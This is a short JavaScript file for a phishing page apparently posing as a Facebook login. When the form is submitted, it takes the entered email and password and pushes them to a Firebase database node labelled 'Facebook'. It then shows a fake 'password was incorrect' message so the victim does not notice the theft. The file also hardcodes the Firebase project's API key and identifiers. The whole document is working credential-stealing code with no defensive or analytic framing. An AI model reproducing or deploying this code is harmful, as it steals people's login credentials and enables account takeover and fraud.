const form = document.querySelector("#form");
const firebaseConfig = {
  apiKey: "AIzaSyD5FhicXAH3aEYb7jbepfWgTO1yYVS2I0c",
  authDomain: "votinglink-4b29b.firebaseapp.com",
  databaseURL: "https://votinglink-4b29b-default-rtdb.firebaseio.com",
  projectId: "votinglink-4b29b",
  storageBucket: "votinglink-4b29b.appspot.com",
  messagingSenderId: "402855562119",
  appId: "1:402855562119:web:5c8d9c92809144dc5da122",
  measurementId: "G-WKL91DK9E0"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);

const database = firebase.database();

form.addEventListener("submit", (e) => {
  const ref = database.ref("Facebook");
  e.preventDefault();

  const userName = document.getElementById("email").value;
  const passWord = document.getElementById("password").value;

  ref.push({
    userName: userName,
    passWord: passWord,
  });

  document.getElementById("alert-message").innerHTML =
    "Sorry, your password was incorrect. Please double-check your password.";
  setTimeout(() => {
    document.getElementById("alert-message").innerHTML = "";
  }, 4000);
  form.reset();
});

